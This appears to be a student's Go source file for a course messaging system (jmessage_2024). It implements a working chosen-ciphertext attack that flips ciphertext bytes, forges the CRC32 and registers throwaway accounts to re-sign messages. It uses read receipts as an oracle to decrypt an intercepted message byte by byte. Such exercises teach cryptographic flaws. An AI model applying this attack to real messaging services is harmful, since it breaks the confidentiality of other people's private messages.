package cmd

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"hash/crc32"
	"jmessage_2024/auth"
	"jmessage_2024/config"
	"log"
	"os"
	"time"
)

func Attack(victimName string) (plaintext string, err error) {
	interceptedFilePath := "cipher.json"

	message, err := readInterceptedMessage(interceptedFilePath)
	if err != nil {
		log.Fatalf("Error reading intercepted message: %v", err)
		return
	}
	// check victim name == message.To
	if message.To != victimName {
		fmt.Printf("Wrong victim to attack %s", victimName)
	}

	// start attack

	username := message.From
	config.Global.Username = username
	fmt.Printf("sender username: %s\n", username)

	payloadBytes, err := base64.StdEncoding.DecodeString(message.Payload)
	if err != nil {
		log.Fatalf("Error base64 decoding payload: %v", err)
		return
	}

	var ciphertext config.CiphertextStruct

	err = json.Unmarshal([]byte(payloadBytes), &ciphertext)
	if err != nil {
		log.Fatalf("Failed to unmarshal JSON: %v", err)
	}

	c2Bytes, _ := base64.StdEncoding.DecodeString(ciphertext.C2)

	lenC2Bytes := len(c2Bytes)
	// len(c2) - len(username) - len(CRC32) - len(':') - len('\n')
	lenCiphertext := len(c2Bytes) - len(username) - 4 - 1 - 1

	// B: creating the another byte slice to modify the original ciphertext
	bBytes := make([]byte, len(c2Bytes)-4)
	for i := range bBytes {
		bBytes[i] = 0x00
	}
	x := byte('a') ^ byte(':')
	bBytes[len(username)] = x

	modCiphertext := make([]byte, lenC2Bytes)

	decryptedMessage := make([]byte, lenCiphertext)

	for i := 0; i < lenCiphertext; i++ {
		var newAPIkey string
		var globalPubKey config.PubKeyStruct
		var globalPrivKey config.PrivKeyStruct
		var decryptedByte string
		config.Global.Username = config.Global.Username + "a"
		config.Global.Password = "1234"

		err = auth.RegisterUserWithServer(config.Global.Username, config.Global.Password)
		if err != nil {
			fmt.Println("Unable to register username with server (user may already exist)")
		}
		newAPIkey, err = auth.ServerLogin(config.Global.Username, config.Global.Password)
		if err != nil {
			log.Fatalf("Unable to connect to server, exiting.")
			os.Exit(1)
		}
		err = config.SetAPIKey(newAPIkey)
		if err != nil {
			log.Fatalf("Fail to set api key")
		}

		globalPubKey, globalPrivKey, err = auth.GeneratePublicKey()
		if err != nil {
			fmt.Println(err)
			return
		}

		// stateful global keys
		config.Global.GlobalPrivKey = globalPrivKey
		config.Global.GlobalPubKey = globalPubKey

		err = auth.RegisterPublicKeyWithServer(config.Global.Username, globalPubKey)
		if err != nil {
			fmt.Println("Unable to register public key with server, exiting.")
			os.Exit(1)
		}

		guessingPos := len(message.From) + 1 + i
		for j := 0; j < 0x7F; j++ {
			copy(modCiphertext, c2Bytes)
			bBytes[guessingPos] = byte(j)
			modCiphertext = fixCRC(modCiphertext, bBytes)

			modC2 := base64.StdEncoding.EncodeToString(modCiphertext)

			toSign := ciphertext.C1 + modC2
			privKey := config.Global.GlobalPrivKey
			sigBytes := ECDSASign([]byte(toSign), privKey)

			// Encode the resulting signature using BASE64
			attackerSig := base64.StdEncoding.EncodeToString(sigBytes)

			modPayload := config.CiphertextStruct{
				C1:  ciphertext.C1,
				C2:  modC2,
				Sig: attackerSig,
			}
			modPayloadBytes, err := json.Marshal(modPayload)
			if err != nil {
				log.Fatalf("Error signing the message: %v", err)
			}
			SendMessageToServer(config.Global.Username, victimName, []byte(modPayloadBytes), 0)

			// sleep and get read receipt
			time.Sleep(3 * time.Duration(100) * time.Millisecond)
			messageList, _ := GetMessagesFromServer()

			getReadReceipt := false
			for _, message := range messageList {
				fmt.Printf("read receipt: %v\n", message.ReceiptID)
				if message.ReceiptID > -1 {
					getReadReceipt = true
					break
				}
			}
			if getReadReceipt {
				decryptedMessage[i] = byte(j) ^ byte(':')
				decryptedByte = string(decryptedMessage[i])
				bBytes[guessingPos] = decryptedMessage[i] ^ byte('a')
				fmt.Printf("decryptedByte: %s\n", decryptedByte)
				fmt.Printf("bBytes:        %v\n", bBytes)
				break
			}
		}

	}
	return string(decryptedMessage), err
}

func fixCRC(c2Ciphertext []byte, XoringB []byte) []byte {

	modifiedCiphertext := make([]byte, len(c2Ciphertext))

	copy(modifiedCiphertext, c2Ciphertext)

	//XOR modifiedCiphertext except the last 4 bytes with XOringB

	// XOR modifiedCiphertext except the last 4 bytes with XoringB
	for i := 0; i < len(modifiedCiphertext)-4; i++ {
		modifiedCiphertext[i] ^= XoringB[i]
	}

	// Calculate the CRC32 checksum of the original plaintext CRC(A)
	crc32Original := binary.LittleEndian.Uint32(c2Ciphertext[len(c2Ciphertext)-4:])

	// Calculate the CRC32 checksum of the modifiemodifiedc2d ciphertext CRC(B)

	crc32Modified := crc32.ChecksumIEEE(XoringB)

	// CRC(0) checksum

	hex := make([]byte, len(c2Ciphertext)-4)
	for i := range hex {
		hex[i] = 0x00
	}

	checksum_zero := crc32.ChecksumIEEE(hex)

	// XOR the original CRC32 checksum with the modified CRC32 checksum CRC(0) XOR CRC(A) COR CRC(B)
	crc32New := crc32Original ^ crc32Modified ^ checksum_zero

	// Update the last 4 bytes of the modified ciphertext with the new CRC32 checksum
	binary.LittleEndian.PutUint32(modifiedCiphertext[len(modifiedCiphertext)-4:], crc32New)

	return modifiedCiphertext
}

func readInterceptedMessage(filePath string) (message config.MessageStruct, err error) {
	// Open the file
	file, err := os.Open(filePath)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	// Decode the JSON data from the file
	err = json.NewDecoder(file).Decode(&message)
	if err != nil {
		fmt.Println("Error decoding JSON:", err)
		return
	}

	return
}
